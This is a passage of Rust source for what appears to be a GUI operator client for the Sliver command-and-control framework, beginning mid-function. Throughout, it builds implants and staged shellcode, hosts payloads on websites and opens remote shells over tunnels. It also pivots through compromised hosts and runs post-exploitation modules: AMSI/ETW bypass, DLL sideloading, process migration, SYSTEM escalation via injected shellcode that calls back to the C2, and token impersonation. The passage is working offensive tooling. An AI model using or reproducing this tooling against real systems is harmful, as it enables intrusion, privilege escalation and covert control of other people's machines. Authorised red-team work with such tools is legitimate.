                    size: data.len() as u64,
                    original_file,
                    content: data,
                    replace_content: true,
                    ..Default::default()
                };
                let req = clientpb::WebsiteAddContent { name: website.clone(), contents: [(path.clone(), content)].into() };
                match c.website_add_content(req).await {
                    Ok(_) => push!(Update::Notice { ok: true, text: format!("hosted {path} on website '{website}'") }),
                    Err(e) => push!(Update::Notice { ok: false, text: format!("host file: {}", e.message()) }),
                }
                if let Ok(sites) = list_websites(&mut c).await { push!(Update::Websites(sites)); }
            }
            Command::UnhostFile { website, path } => {
                let req = clientpb::WebsiteRemoveContent { name: website.clone(), paths: vec![path.clone()] };
                match c.website_remove_content(req).await {
                    Ok(_) => push!(Update::Notice { ok: true, text: format!("removed {path} from '{website}'") }),
                    Err(e) => push!(Update::Notice { ok: false, text: format!("remove content: {}", e.message()) }),
                }
                if let Ok(sites) = list_websites(&mut c).await { push!(Update::Websites(sites)); }
            }
            Command::RemoveWebsite { name } => {
                match c.website_remove(clientpb::Website { name: name.clone(), ..Default::default() }).await {
                    Ok(_) => push!(Update::Notice { ok: true, text: format!("removed website '{name}'") }),
                    Err(e) => push!(Update::Notice { ok: false, text: format!("remove website: {}", e.message()) }),
                }
                if let Ok(sites) = list_websites(&mut c).await { push!(Update::Websites(sites)); }
            }

            // ---- Beacons ----
            Command::RefreshBeaconTasks { beacon_id } => {
                match c.get_beacon_tasks(clientpb::Beacon { id: beacon_id.clone(), ..Default::default() }).await {
                    Ok(r) => push!(Update::BeaconTasks { beacon_id, tasks: r.into_inner().tasks }),
                    Err(e) => push!(Update::Notice { ok: false, text: format!("beacon tasks: {}", e.message()) }),
                }
            }
            Command::BeaconTaskContent { beacon_id, task_id } => {
                match c.get_beacon_task_content(clientpb::BeaconTask { id: task_id.clone(), ..Default::default() }).await {
                    Ok(r) => {
                        let (title, body) = render_beacon_task(&r.into_inner());
                        push!(Update::Output { target: beacon_id, title, body, ok: true });
                    }
                    Err(e) => push!(Update::Notice { ok: false, text: format!("task content: {}", e.message()) }),
                }
            }
            Command::CancelBeaconTask { beacon_id, task_id } => {
                match c.cancel_beacon_task(clientpb::BeaconTask { id: task_id, ..Default::default() }).await {
                    Ok(_) => {
                        push!(Update::Notice { ok: true, text: "task cancelled".into() });
                        if let Ok(r) = c.get_beacon_tasks(clientpb::Beacon { id: beacon_id.clone(), ..Default::default() }).await {
                            push!(Update::BeaconTasks { beacon_id, tasks: r.into_inner().tasks });
                        }
                    }
                    Err(e) => push!(Update::Notice { ok: false, text: format!("cancel: {}", e.message()) }),
                }
            }
            Command::RmBeacon { beacon_id } => {
                match c.rm_beacon(clientpb::Beacon { id: beacon_id, ..Default::default() }).await {
                    Ok(_) => { push!(Update::Notice { ok: true, text: "beacon removed".into() }); refresh_all(c, &upd_tx, &ctx).await; }
                    Err(e) => push!(Update::Notice { ok: false, text: format!("rm beacon: {}", e.message()) }),
                }
            }

            // ---- Pivoting ----
            Command::StartSocks { target, bind } => {
                start_socks(c.clone(), socks, pivots.clone(), ctx.clone(), upd_tx.clone(), target, bind).await;
            }
            Command::StartPortfwd { target, bind, remote_host, remote_port } => {
                start_portfwd(c.clone(), hub, pivots.clone(), ctx.clone(), upd_tx.clone(), target, bind, remote_host, remote_port).await;
            }
            Command::StartRportfwd { target, bind_addr, bind_port, fwd_addr, fwd_port } => {
                start_rportfwd(&mut c, hub, pivots.clone(), ctx.clone(), upd_tx.clone(), target, bind_addr, bind_port, fwd_addr, fwd_port).await;
            }
            Command::StopPivot { id } => {
                stop_pivot(&mut c, &pivots, id).await;
                push_pivots(&pivots, &upd_tx, &ctx).await;
            }
            Command::RefreshPivotsList => push_pivots(&pivots, &upd_tx, &ctx).await,
            Command::Execute { target, path, args } => {
                let req = sliverpb::ExecuteReq {
                    path: path.clone(),
                    args,
                    output: true,
                    request: Some(target.request(60)),
                    ..Default::default()
                };
                match c.execute(req).await {
                    Ok(r) => {
                        let e = r.into_inner();
                        let mut body = String::new();
                        if !e.stdout.is_empty() {
                            body.push_str(&String::from_utf8_lossy(&e.stdout));
                        }
                        if !e.stderr.is_empty() {
                            body.push_str("\n[stderr]\n");
                            body.push_str(&String::from_utf8_lossy(&e.stderr));
                        }
                        let async_note = e.response.as_ref().map(|r| r.r#async).unwrap_or(false);
                        if async_note && body.trim().is_empty() {
                            body = "task queued for beacon (results arrive on next checkin)".into();
                        }
                        push!(Update::Output {
                            target: target.key(),
                            title: format!("execute: {path}"),
                            body,
                            ok: true,
                        });
                    }
                    Err(e) => push!(Update::Output {
                        target: target.key(),
                        title: format!("execute: {path}"),
                        body: e.message().to_string(),
                        ok: false,
                    }),
                }
            }
            Command::Ps { target } => {
                let req = sliverpb::PsReq { request: Some(target.request(60)), ..Default::default() };
                match c.ps(req).await {
                    Ok(r) => {
                        let ps = r.into_inner();
                        let mut body = format!("{:>8}  {:>8}  {}\n", "PID", "PPID", "EXECUTABLE");
                        for p in ps.processes {
                            body.push_str(&format!("{:>8}  {:>8}  {} {}\n", p.pid, p.ppid, p.executable, p.owner));
                        }
                        push!(Update::Output { target: target.key(), title: "ps".into(), body, ok: true });
                    }
                    Err(e) => push!(Update::Output { target: target.key(), title: "ps".into(), body: e.message().into(), ok: false }),
                }
            }
            Command::Ls { target, path } => {
                let req = sliverpb::LsReq { path: path.clone(), request: Some(target.request(60)) };
                match c.ls(req).await {
                    Ok(r) => push!(Update::FileListing { target: target.key(), listing: r.into_inner() }),
                    Err(e) => push!(Update::Output { target: target.key(), title: format!("ls {path}"), body: e.message().into(), ok: false }),
                }
            }
            Command::Screenshot { target } => {
                let req = sliverpb::ScreenshotReq { request: Some(target.request(60)) };
                match c.screenshot(req).await {
                    Ok(r) => push!(Update::Screenshot { target: target.key(), png: r.into_inner().data }),
                    Err(e) => push!(Update::Output { target: target.key(), title: "screenshot".into(), body: e.message().into(), ok: false }),
                }
            }
            Command::KillSession(target) => {
                let req = sliverpb::KillReq { force: true, request: Some(target.request(30)) };
                match c.kill(req).await {
                    Ok(_) => push!(Update::Notice { ok: true, text: format!("kill sent to {}", target.key()) }),
                    Err(e) => push!(Update::Notice { ok: false, text: e.message().into() }),
                }
            }
            Command::Rename { target, name } => {
                let req = clientpb::RenameReq {
                    session_id: target.session_id.clone(),
                    beacon_id: target.beacon_id.clone(),
                    name,
                };
                match c.rename(req).await {
                    Ok(_) => { refresh_all(c, &upd_tx, &ctx).await; }
                    Err(e) => push!(Update::Notice { ok: false, text: e.message().into() }),
                }
            }
            Command::KillJob(id) => {
                match c.kill_job(clientpb::KillJobReq { id }).await {
                    Ok(_) => push!(Update::Notice { ok: true, text: format!("job {id} killed") }),
                    Err(e) => push!(Update::Notice { ok: false, text: e.message().into() }),
                }
            }
            Command::StartListener(spec) => start_listener(&mut c, spec, &upd_tx, &ctx).await,
            Command::RestartListener { job_id, spec, previous } => restart_listener(&mut c, job_id, spec, previous, &upd_tx, &ctx).await,
            Command::Generate { mut config, name, save_dir } => {
                // WireGuard implants need a unique tunnel IP, as the stock client assigns.
                if config.include_wg && config.wg_peer_tun_ip.is_empty() {
                    match c.generate_unique_ip(commonpb::Empty {}).await {
                        Ok(r) => config.wg_peer_tun_ip = r.into_inner().ip,
                        Err(e) => { push!(Update::GenerateDone { name, path: String::new(), ok: false, msg: format!("wg tunnel ip: {}", e.message()) }); return; }
                    }
                }
                let req = clientpb::GenerateReq { config: Some(config), name: name.clone() };
                match c.generate(req).await {
                    Ok(r) => {
                        let g = r.into_inner();
                        let built = if g.implant_name.is_empty() { name } else { g.implant_name };
                        push!(deliver_build(built, g.file, save_dir.as_deref()));
                    }
                    Err(e) => push!(Update::GenerateDone { name, path: String::new(), ok: false, msg: e.message().into() }),
                }
            }
            Command::GenerateStaged { mut config, name, bind_host, bind_port, protocol, server_lhost, stager_format, stager_arch, save_dir } => {
                if config.include_wg && config.wg_peer_tun_ip.is_empty() {
                    match c.generate_unique_ip(commonpb::Empty {}).await {
                        Ok(r) => config.wg_peer_tun_ip = r.into_inner().ip,
                        Err(e) => { push!(Update::Notice { ok: false, text: format!("staged: wg tunnel ip: {}", e.message()) }); return; }
                    }
                }
                // The stage is the full implant compiled as shellcode.
                let built = if name.is_empty() { format!("stage-{bind_port}") } else { name };
                let req = clientpb::GenerateReq { config: Some(config), name: built };
                let data = match c.generate(req).await {
                    Ok(r) => r.into_inner().file.map(|f| f.data).unwrap_or_default(),
                    Err(e) => { push!(Update::Notice { ok: false, text: format!("staged: stage build failed: {}", e.message()) }); return; }
                };
                if data.is_empty() { push!(Update::Notice { ok: false, text: "staged: stage build returned no shellcode".into() }); return; }
                let stage_bytes = data.len();
                // Host the stage so the stub can pull it.
                let data = if protocol == 0 { prepend_stage_size(data) } else { data };
                match c.start_tcp_stager_listener(clientpb::StagerListenerReq { protocol, host: bind_host, port: bind_port, data, profile_name: String::new() }).await {
                    Ok(r) => { let job_id = r.into_inner().job_id;
                        push!(Update::StagedReady { job_id, server_lhost, bind_port, protocol, stager_format, stager_arch, save_dir, stage_bytes }); }
                    Err(e) => push!(Update::Notice { ok: false, text: format!("staged: stager listener failed: {}", e.message()) }),
                }
            }
            Command::Shutdown | Command::Cancel { .. } | Command::ClientLog(_) => {}
        }
    });
    if let Some((target, label)) = tracked {
        static NEXT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(1);
        let id = NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        RUNNING.lock().insert(id, task.abort_handle());
        let _ = watch_tx.send(Update::Running { id, target: target.clone(), label: label.clone() });
        tokio::spawn(async move {
            let cancelled = task.await.is_err_and(|e| e.is_cancelled());
            RUNNING.lock().remove(&id);
            let _ = watch_tx.send(Update::Finished { id, target, label, cancelled });
            watch_ctx.request_repaint();
        });
    }
}

/// Requests to sessions that can be cancelled, by id.
static RUNNING: std::sync::LazyLock<Mutex<HashMap<u64, tokio::task::AbortHandle>>> = std::sync::LazyLock::new(Default::default);

/// Console-style requests that wait on a session (and so can hang): their
/// target and a short label. Beacon requests only queue a task, so they're
/// never tracked.
fn tracked_label(cmd: &Command) -> Option<(String, String)> {
    let (t, label) = match cmd {
        Command::Execute { target, path, args } => (target, format!("execute {path} {}", args.join(" ")).trim_end().to_string()),
        Command::Ls { target, path } => (target, format!("ls {path}")),
        Command::Download { target, path, .. } => (target, format!("download {path}")),
        Command::Upload { target, remote, .. } => (target, format!("upload {remote}")),
        Command::Rm { target, path, .. } => (target, format!("rm {path}")),
        Command::Mkdir { target, path } => (target, format!("mkdir {path}")),
        Command::Screenshot { target } => (target, "screenshot".into()),
        Command::Ps { target } => (target, "ps".into()),
        Command::Module { target, spec } => (target, module_label(spec)),
        Command::Op(op) => match op {
            Op::Cd { target, path } => (target, format!("cd {path}")),
            Op::Pwd { target } => (target, "pwd".into()),
            Op::Cp { target, src, dst } => (target, format!("cp {src} {dst}")),
            Op::Mv { target, src, dst } => (target, format!("mv {src} {dst}")),
            Op::Chmod { target, path, mode, .. } => (target, format!("chmod {mode} {path}")),
            Op::Grep { target, pattern, path, .. } => (target, format!("grep {pattern} {path}")),
            Op::Mounts { target } => (target, "mounts".into()),
            Op::UploadIoc { target, remote, .. } => (target, format!("upload {remote}")),
            _ => return None,
        },
        _ => return None,
    };
    (!t.is_beacon()).then(|| (t.key(), label))
}

fn module_label(spec: &ModuleSpec) -> String {
    match spec {
        ModuleSpec::ExecuteAssembly { .. } => "execute-assembly".into(),
        ModuleSpec::Sideload { .. } => "sideload".into(),
        ModuleSpec::SpawnDll { .. } => "spawndll".into(),
        ModuleSpec::CallExtension { name, .. } => name.clone(),
        ModuleSpec::RegisterExtension { name, .. } => format!("register {name}"),
        ModuleSpec::Migrate { pid, .. } => format!("migrate {pid}"),
        ModuleSpec::GetSystem { .. } => "getsystem".into(),
        ModuleSpec::Impersonate { username } => format!("impersonate {username}"),
        ModuleSpec::RevToSelf => "rev2self".into(),
        ModuleSpec::MakeToken { username, .. } => format!("make-token {username}"),
        ModuleSpec::GetPrivs => "getprivs".into(),
        ModuleSpec::Ifconfig => "ifconfig".into(),
        ModuleSpec::Netstat => "netstat".into(),
        ModuleSpec::GetEnv => "getenv".into(),
        ModuleSpec::WhoAmI => "whoami".into(),
    }
}

/// Turn a build's file into an update: written straight to `save_dir` when
/// one is given (headless hooks), otherwise handed to the UI to prompt.
pub(crate) fn deliver_build(name: String, file: Option<commonpb::File>, save_dir: Option<&str>) -> Update {
    let Some(file) = file.filter(|f| !f.data.is_empty()) else {
        return Update::GenerateDone { name, path: String::new(), ok: false, msg: "server returned no file".into() };
    };
    let file_name = if file.name.is_empty() { format!("{name}.bin") } else { file.name };
    let Some(dir) = save_dir else {
        return Update::BuildReady { name, file_name, data: file.data };
    };
    let path = std::path::Path::new(dir).join(&file_name);
    match std::fs::write(&path, &file.data) {
        Ok(_) => Update::GenerateDone { name, path: path.display().to_string(), ok: true, msg: format!("{} bytes", file.data.len()) },
        Err(e) => Update::GenerateDone { name, path: String::new(), ok: false, msg: format!("write failed: {e}") },
    }
}

/// Create a tunnel, bind it on the shared stream, and open a shell on it. The
/// shared `TunnelData` stream is created on the first shell, primed with this
/// tunnel's bind frame so the open does not block on an empty request stream.
#[allow(clippy::too_many_arguments)]
async fn open_shell(
    c: &mut Rpc,
    hub_handle: TunnelHandle,
    ctx: egui::Context,
    target: Target,
    pty: bool,
    path: String,
    rows: u32,
    cols: u32,
    upd_tx: &crossbeam_channel::Sender<Update>,
) {
    macro_rules! push {
        ($u:expr) => {{ let _ = upd_tx.send($u); ctx.request_repaint(); }};
    }
    // Shells require a live (synchronous) session, not a beacon.
    let session_id = target.session_id.clone();
    if session_id.is_empty() {
        push!(Update::Notice { ok: false, text: "interactive shells require a session (not a beacon)".into() });
        return;
    }

    let tunnel = match c.create_tunnel(sliverpb::Tunnel { session_id: session_id.clone(), ..Default::default() }).await {
        Ok(r) => r.into_inner(),
        Err(e) => { push!(Update::Notice { ok: false, text: format!("create tunnel: {}", e.message()) }); return; }
    };
    let tid = tunnel.tunnel_id;
    let bind_frame = sliverpb::TunnelData { tunnel_id: tid, session_id: session_id.clone(), ..Default::default() };

    // Register a bind waiter and send the bind frame, creating the shared stream
    // on first use (primed with that same bind frame).
    let rx = {
        let mut guard = hub_handle.lock().await;
        let (tx, rx) = oneshot::channel();
        if let Some(hub) = guard.as_ref() {
            hub.bind_waiters.lock().insert(tid, tx);
            hub.open.lock().insert(tid);
            hub.send(bind_frame);
        } else {
            let (hub, out_rx) = TunnelHub::new();
            hub.bind_waiters.lock().insert(tid, tx);
            hub.open.lock().insert(tid);
            hub.send(bind_frame); // buffered into out_rx before the stream opens
            if !open_tunnel_stream(c.clone(), ctx.clone(), upd_tx.clone(), hub.clone(), out_rx).await {
                push!(Update::Notice { ok: false, text: "tunnel stream unavailable".into() });
                return;
            }
            *guard = Some(hub);
        }
        rx
    };

    // Wait for the server to acknowledge the bind before starting the shell.
    let _ = tokio::time::timeout(Duration::from_secs(10), rx).await;

    let shell_path = if path.is_empty() { String::new() } else { path };
    let req = sliverpb::ShellReq {
        path: shell_path,
        enable_pty: pty,
        pid: 0,
        rows,
        cols,
        tunnel_id: tid,
        request: Some(target.request(10)),
    };
    match c.shell(req).await {
        Ok(r) => {
            let sh = r.into_inner();
            if let Some(resp) = &sh.response {
                if !resp.err.is_empty() {
                    push!(Update::Notice { ok: false, text: format!("shell: {}", resp.err) });
                    return;
                }
            }
            push!(Update::ShellOpened { target: target.key(), tunnel_id: tid, pty });
        }
        Err(e) => push!(Update::Notice { ok: false, text: format!("shell: {}", e.message()) }),
    }
}

/// Build a minimal, valid `ImplantConfig` for a `GetSystemReq`.
///
/// Sliver's `GetSystem` RPC dereferences `req.Config` to generate the shellcode
/// it injects into the hosting process; a nil `Config` makes the server panic
/// (nil-pointer deref at rpc-priv.go). We reuse the live session's OS/arch and
/// its active C2 URL so the spawned SYSTEM implant can call back to the same
/// listener, exactly as the stock client does.
fn getsystem_config(goos: &str, goarch: &str, active_c2: &str) -> clientpb::ImplantConfig {
    const NS: i64 = 1_000_000_000;
    let c2_url = if active_c2.is_empty() { String::new() } else { active_c2.to_string() };
    let is_mtls = c2_url.starts_with("mtls://");
    let is_http = c2_url.starts_with("http://") || c2_url.starts_with("https://");
    let is_dns = c2_url.starts_with("dns://");
    clientpb::ImplantConfig {
        goos: goos.to_string(),
        goarch: goarch.to_string(),
        format: 1, // shellcode
        is_shellcode: true,
        c2: if c2_url.is_empty() { vec![] } else {
            vec![clientpb::ImplantC2 { id: String::new(), priority: 0, url: c2_url, options: String::new() }]
        },
        include_mtls: is_mtls,
        include_http: is_http,
        include_dns: is_dns,
        reconnect_interval: 60 * NS,
        max_connection_errors: 1000,
        poll_timeout: 360 * NS,
        template_name: "sliver".into(),
        httpc2_config_name: "default".into(),
        ..Default::default()
    }
}

/// Look up a session by id and return `(os, arch, active_c2)` for building a
/// follow-on implant config (e.g. for GetSystem).
async fn session_build_info(c: &mut Rpc, session_id: &str) -> Option<(String, String, String)> {
    c.get_sessions(commonpb::Empty {}).await.ok()
        .and_then(|r| r.into_inner().sessions.into_iter().find(|s| s.id == session_id))
        .map(|s| (s.os, s.arch, s.active_c2))
}

/// Execute a post-exploitation module and route its result to the console.
async fn run_module(
    c: &mut Rpc,
    target: Target,
    spec: ModuleSpec,
    upd_tx: &crossbeam_channel::Sender<Update>,
    ctx: &egui::Context,
) {
    let key = target.key();
    macro_rules! out {
        ($title:expr, $body:expr, $ok:expr) => {{
            let _ = upd_tx.send(Update::Output { target: key.clone(), title: $title, body: $body, ok: $ok });
            ctx.request_repaint();
        }};
    }
    macro_rules! res {
        ($title:expr, $call:expr, $render:expr) => {{
            match $call.await {
                Ok(r) => { let v = r.into_inner(); out!($title.to_string(), $render(v), true); }
                Err(e) => out!($title.to_string(), e.message().to_string(), false),
            }
        }};
    }
    let req = Some(target.request(60));
    match spec {
        ModuleSpec::ExecuteAssembly { data, args, process, is_dll, amsi_bypass, etw_bypass, class_name, method, arch } => {
            let r = sliverpb::ExecuteAssemblyReq {
                assembly: data, arguments: args, process, is_dll, arch,
                class_name, method, amsi_bypass, etw_bypass, request: req, ..Default::default()
            };
            res!("execute-assembly", c.execute_assembly(r), |v: sliverpb::ExecuteAssembly| String::from_utf8_lossy(&v.output).into_owned());
        }
        ModuleSpec::Sideload { data, args, entry_point, process, is_dll } => {
            let r = sliverpb::SideloadReq {
                data, args: split_args(&args), entry_point, process_name: process, is_dll, request: req, ..Default::default()
            };
            res!("sideload", c.sideload(r), |v: sliverpb::Sideload| v.result);
        }
        ModuleSpec::SpawnDll { data, args, entry_point, process } => {
            let r = sliverpb::InvokeSpawnDllReq {
                data, args: split_args(&args), entry_point, process_name: process, request: req, ..Default::default()
            };
            res!("spawndll", c.spawn_dll(r), |v: sliverpb::SpawnDll| v.result);
        }
        ModuleSpec::RegisterExtension { name, data, os, init } => {
            let r = sliverpb::RegisterExtensionReq { name: name.clone(), data, os, init, request: req };
            match c.register_extension(r).await {
                Ok(_) => out!(format!("register-extension {name}"), "loaded into implant".into(), true),
                Err(e) => out!(format!("register-extension {name}"), e.message().into(), false),
            }
        }
        ModuleSpec::CallExtension { name, export, args, is_bof, bof_data } => {
            let r = sliverpb::CallExtensionReq {
                name: name.clone(), export, args, is_bof, bof_data, want_bof_outputs: true, request: req, ..Default::default()
            };
            match c.call_extension(r).await {
                Ok(resp) => {
                    let v = resp.into_inner();
                    let mut body = String::from_utf8_lossy(&v.output).into_owned();
                    for bo in &v.bof_outputs {
                        body.push_str(&String::from_utf8_lossy(&bo.data));
                    }
                    out!(format!("call-extension {name}"), body, true);
                }
                Err(e) => out!(format!("call-extension {name}"), e.message().into(), false),
            }
        }
        ModuleSpec::Migrate { pid, process } => {
            let r = clientpb::MigrateReq { pid, proc_name: process, request: req, ..Default::default() };
            match c.migrate(r).await {
                Ok(resp) => {
                    let ok = resp.into_inner().response.map(|x| x.err.is_empty()).unwrap_or(true);
                    out!("migrate".into(), if ok { format!("migrated into pid {pid}") } else { "migrate failed".into() }, ok);
                }
                Err(e) => out!("migrate".into(), e.message().into(), false),
            }
        }
        ModuleSpec::GetSystem { process } => {
            // A nil Config crashes the server (nil-pointer deref); build one from
            // the live session so the spawned SYSTEM implant reuses its C2.
            let config = match session_build_info(c, &target.session_id).await {
                Some((os, arch, c2)) => getsystem_config(&os, &arch, &c2),
                None => { out!("getsystem".into(), "getsystem needs an active session".into(), false); return; }
            };
            let r = clientpb::GetSystemReq { hosting_process: process, config: Some(config), request: req, ..Default::default() };
            res!("getsystem", c.get_system(r), |v: sliverpb::GetSystem| v.response.map(|x| if x.err.is_empty() { "got SYSTEM".into() } else { x.err }).unwrap_or_default());
        }
        ModuleSpec::Impersonate { username } => {
            let r = sliverpb::ImpersonateReq { username: username.clone(), request: req };
            res!("impersonate", c.impersonate(r), move |_v: sliverpb::Impersonate| format!("impersonating {username}"));
        }
        ModuleSpec::RevToSelf => {
            let r = sliverpb::RevToSelfReq { request: req };
            res!("rev2self", c.rev_to_self(r), |_v: sliverpb::RevToSelf| "reverted to self".to_string());
        }
        ModuleSpec::MakeToken { username, password, domain, logon_type } => {
            let r = sliverpb::MakeTokenReq { username: username.clone(), password, domain, logon_type, request: req };
            res!("make-token", c.make_token(r), move |_v: sliverpb::MakeToken| format!("token created for {username}"));
        }
        ModuleSpec::GetPrivs => {
            let r = sliverpb::GetPrivsReq { request: req };
            res!("getprivs", c.get_privs(r), |v: sliverpb::GetPrivs| {
                let mut s = format!("Process: {} (integrity: {})\n", v.process_name, v.process_integrity);
                for p in v.priv_info {
                    s.push_str(&format!("  {:<32} {}\n", p.name, if p.enabled { "Enabled" } else { "Disabled" }));
                }
                s
            });
        }
        ModuleSpec::Ifconfig => {
            let r = sliverpb::IfconfigReq { request: req };
            res!("ifconfig", c.ifconfig(r), |v: sliverpb::Ifconfig| {
                let mut s = String::new();
                for ni in v.net_interfaces {
                    s.push_str(&format!("{} ({})\n", ni.name, ni.mac));
                    for ip in ni.ip_addresses { s.push_str(&format!("  {ip}\n")); }
                }
                s
            });
        }
        ModuleSpec::Netstat => {
            let r = sliverpb::NetstatReq { tcp: true, udp: true, ip4: true, ip6: true, listening: true, request: req };
            res!("netstat", c.netstat(r), |v: sliverpb::Netstat| {
                let mut s = format!("{:<6} {:<24} {:<24} {}\n", "PROTO", "LOCAL", "REMOTE", "STATE");
                for e in v.entries {
                    let l = e.local_addr.map(|a| format!("{}:{}", a.ip, a.port)).unwrap_or_default();
                    let r = e.remote_addr.map(|a| format!("{}:{}", a.ip, a.port)).unwrap_or_default();
                    s.push_str(&format!("{:<6} {:<24} {:<24} {}\n", e.protocol, l, r, e.sk_state));
                }
                s
            });
        }
        ModuleSpec::GetEnv => {
            let r = sliverpb::EnvReq { name: String::new(), request: req };
            res!("env", c.get_env(r), |v: sliverpb::EnvInfo| {
                let mut s = String::new();
                for e in v.variables { s.push_str(&format!("{}={}\n", e.key, e.value)); }
                s
            });
        }
        ModuleSpec::WhoAmI => {
            let r = sliverpb::CurrentTokenOwnerReq { request: req };
            res!("whoami", c.current_token_owner(r), |v: sliverpb::CurrentTokenOwner| v.output);
        }
    }
}

fn split_args(s: &str) -> Vec<String> {
    if s.trim().is_empty() { Vec::new() } else { vec![s.to_string()] }
}

fn gunzip(data: &[u8]) -> Vec<u8> {
    use std::io::Read;
    let mut out = Vec::new();
    let mut dec = flate2::read::GzDecoder::new(data);
    if dec.read_to_end(&mut out).is_ok() {
        out
    } else {
        data.to_vec()
    }
}

/// Headless self-test against a live server (no GUI). Validates the mTLS
/// channel, core RPCs, and — when the matching env vars are set — starting an
/// mTLS listener and generating an implant. Prints results and returns.
pub fn selftest(cfg: OperatorConfig) {
    let rt = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(2)
        .enable_all()
        .build()
        .expect("tokio runtime");
    rt.block_on(async move {
        println!("[selftest] connecting to {}:{} as {}", cfg.lhost, cfg.lport, cfg.operator);
        let rpc = match establish(&cfg).await {
            Ok(r) => r,
            Err(e) => { println!("[selftest] CONNECT FAILED: {e:#}"); return; }
        };
        let mut c = rpc.clone();
        match c.get_version(commonpb::Empty {}).await {
            Ok(r) => { let v = r.into_inner(); println!("[selftest] connected OK — server v{}.{}.{} ({})", v.major, v.minor, v.patch, v.commit); }
            Err(e) => { println!("[selftest] get_version FAILED: {}", e.message()); return; }
        }

        match c.get_sessions(commonpb::Empty {}).await {
            Ok(r) => {
                let s = r.into_inner().sessions;
                println!("[selftest] sessions: {}", s.len());
                for x in &s { println!("    session {} {} {}@{} {}/{} transport={}", &x.id[..x.id.len().min(8)], x.name, x.username, x.hostname, x.os, x.arch, x.transport); }
            }
            Err(e) => println!("[selftest] get_sessions FAILED: {}", e.message()),
        }

        // Optional session battery: exercise exec/ls/ps, post-ex modules, and a
        // full interactive-shell round-trip over the tunnel data plane.
        if let Ok(want) = std::env::var("SLIVER_GUI_SESSION") {
            let sid = if want == "auto" {
                c.get_sessions(commonpb::Empty {}).await.ok()
                    .and_then(|r| r.into_inner().sessions.into_iter().next().map(|s| s.id))
            } else {
                // Resolve a full id, an id prefix, or a session name.
                c.get_sessions(commonpb::Empty {}).await.ok()
                    .and_then(|r| r.into_inner().sessions.into_iter()
                        .find(|s| s.id == want || s.id.starts_with(&want) || s.name == want)
                        .map(|s| s.id))
                    .or(Some(want))
            };
            if let Some(sid) = sid {
                session_battery(&mut rpc.clone(), &sid).await;
            } else {
                println!("[selftest] no session available for battery");
            }
        }

        // Dev-only: start a pivot listener and leave it running
        // (SLIVER_GUI_PIVOT_LISTEN=<session prefix>=<bind>[=pipe]).
        if let Ok(spec) = std::env::var("SLIVER_GUI_PIVOT_LISTEN") {
            let mut it = spec.splitn(3, '=');
            let (want, bind, pipe) = (it.next().unwrap_or(""), it.next().unwrap_or("0.0.0.0:9898"), it.next() == Some("pipe"));
            if let Some(sid) = c.get_sessions(commonpb::Empty {}).await.ok()
                .and_then(|r| r.into_inner().sessions.into_iter().find(|s| s.id.starts_with(want)).map(|s| s.id)) {
                let kind = if pipe { sliverpb::PivotType::NamedPipe } else { sliverpb::PivotType::Tcp };
                match c.pivot_start_listener(sliverpb::PivotStartListenerReq { r#type: kind as i32, bind_address: bind.into(), options: Vec::new(), request: Some(Target::session(&sid).request(30)) }).await {
                    Ok(r) => { let l = r.into_inner(); println!("[selftest] pivot listener {} on {} (err {:?})", l.id, l.bind_address, l.response.map(|x| x.err)); }
                    Err(e) => println!("[selftest] pivot listener FAILED: {}", e.message()),
                }
            }
        }

        // Dev-only: dump implant build configs and listener jobs (SLIVER_GUI_BUILDINFO=<name filter>).
        if let Ok(filter) = std::env::var("SLIVER_GUI_BUILDINFO") {
            if let Ok(r) = c.implant_builds(commonpb::Empty {}).await {
                let mut b: Vec<_> = r.into_inner().configs.into_iter().filter(|(n, _)| n.contains(&filter)).collect();
                b.sort_by_key(|(_, cfg)| cfg.id.clone());
                for (n, cfg) in b {
                    println!("[selftest] build {n}: {}/{} format={} beacon={} c2={:?} mtls={} wg={} tcp={} pipe={} http={} dns={} wg_ip={} wg_key_port={} wg_comms_port={} debug={} evasion={} obf={} limits=[host={:?} user={:?} dt={:?} domain={} file={:?} locale={:?}] reconnect={}s poll={}s max_errors={} conn_strategy={:?} template={} http_profile={}",
                        cfg.goos, cfg.goarch, cfg.format, cfg.is_beacon, cfg.c2.iter().map(|x| x.url.clone()).collect::<Vec<_>>(),
                        cfg.include_mtls, cfg.include_wg, cfg.include_tcp, cfg.include_name_pipe, cfg.include_http, cfg.include_dns,
                        cfg.wg_peer_tun_ip, cfg.wg_key_exchange_port, cfg.wg_tcp_comms_port, cfg.debug, cfg.evasion, cfg.obfuscate_symbols,
                        cfg.limit_hostname, cfg.limit_username, cfg.limit_datetime, cfg.limit_domain_joined, cfg.limit_file_exists, cfg.limit_locale,
                        cfg.reconnect_interval / 1_000_000_000, cfg.poll_timeout / 1_000_000_000, cfg.max_connection_errors, cfg.connection_strategy,
                        cfg.template_name, cfg.httpc2_config_name);
                }
            }
            // ...and re-download one build to a folder (SLIVER_GUI_REGEN=<name>=<dir>).
            if let Some((name, dir)) = std::env::var("SLIVER_GUI_REGEN").ok().as_deref().and_then(|v| v.split_once('=')) {
                match c.regenerate(clientpb::RegenerateReq { implant_name: name.into() }).await {
                    Ok(r) => match deliver_build(name.into(), r.into_inner().file, Some(dir)) {
                        Update::GenerateDone { path, ok, msg, .. } => println!("[selftest] regenerate {name}: ok={ok} {path} {msg}"),
                        _ => {}
                    },
                    Err(e) => println!("[selftest] regenerate {name} FAILED: {}", e.message()),
                }
            }
            // ...and delete test builds (SLIVER_GUI_RMBUILDS=<name,name>).
            for name in std::env::var("SLIVER_GUI_RMBUILDS").unwrap_or_default().split(',').filter(|n| !n.is_empty()) {
                match c.delete_implant_build(clientpb::DeleteReq { name: name.into() }).await {
                    Ok(_) => println!("[selftest] deleted build {name}"),
                    Err(e) => println!("[selftest] delete build {name} FAILED: {}", e.message()),
                }
            }
            if let Ok(sites) = list_websites(&mut c).await {
                for w in sites {
                    for (path, ct) in &w.contents {
                        println!("[selftest] website {} {} (id {path}): {} bytes, type {}", w.name, ct.path, ct.size, ct.content_type);
                    }
                }
            }
            if let Ok(r) = c.get_jobs(commonpb::Empty {}).await {
                for j in r.into_inner().active {
                    println!("[selftest] job {} {} {} port={} domains={:?} desc={:?} profile={:?}", j.id, j.name, j.protocol, j.port, j.domains, j.description, j.profile_name);
                }
            }
        }

        // Dev-only: seed / remove sample GUI data (SLIVER_GUI_SEED=1|rm, + SLIVER_GUI_SESSION for the IOC upload).
        if let Ok(mode) = std::env::var("SLIVER_GUI_SEED") {
            let want = std::env::var("SLIVER_GUI_SEED_SESSION").unwrap_or_default();
